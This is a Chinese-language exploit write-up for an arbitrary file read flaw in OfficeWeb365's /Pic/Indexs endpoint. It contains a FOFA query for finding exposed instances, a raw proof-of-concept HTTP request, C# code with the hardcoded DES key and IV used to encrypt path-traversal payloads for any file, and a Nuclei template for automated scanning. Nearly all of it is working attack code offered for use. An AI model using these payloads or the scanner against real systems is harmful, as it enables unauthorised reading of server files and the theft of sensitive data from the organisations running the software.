## OfficeWeb365_任意文件读取漏洞

OfficeWeb365 /Pic/Indexs接口处存在任意文件读取漏洞，攻击者可通过独特的加密方式对payload进行加密，读取任意文件，获取服务器敏感信息，使系统处于极不安全的状态。

## fofa
```
body="请输入furl参数" || header="OfficeWeb365" || banner="OfficeWeb365"
```

## poc
```
GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
DNT: 1
Upgrade-Insecure-Requests: 1
```

## 读取文件加密方式
```C#
Enc("/../../Windows/win.ini");

static string Enc(string plainText)
{

// 定义 DES 算法的密钥和初始化向量
byte[] Keys = new byte[] { 102, 16, 93, 156, 78, 4, 218, 32 };
byte[] Iv = new byte[] { 55, 103, 246, 79, 36, 99, 167, 3 };

// 将明文转换为字节数组
byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);

// 创建 DES 加密服务提供程序，并设置密钥和初始化向量
DESCryptoServiceProvider desCryptoServiceProvider = new DESCryptoServiceProvider
{
Key = Keys,
IV = Iv
};

// 创建内存流以存储加密后的数据
MemoryStream memoryStream = new MemoryStream();

// 创建 DES 加密器
ICryptoTransform transform = desCryptoServiceProvider.CreateEncryptor();

// 使用 CryptoStream 执行加密
using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
{
cryptoStream.Write(plainBytes, 0, plainBytes.Length);
cryptoStream.FlushFinalBlock();
}

// 将加密后的数据转换为 Base64 字符串
string encryptedText = Convert.ToBase64String(memoryStream.ToArray());

return encryptedText+"09";
}
```

## Nuclei脚本
```
id: OfficeWeb365_Pic_Indexs_fileread

info:
  name: OfficeWeb365_Pic_Indexs_fileread
  author: MMY
  severity: high
  description: OfficeWeb365_Pic_Indexs_fileread
  reference:
    - https://
  tags: OfficeWeb365

http:
  - raw:
      - |+
        GET /Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09 HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
        DNT: 1
        Connection: close


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 16-bit app support
      - type: status
        status:
          - 200


```
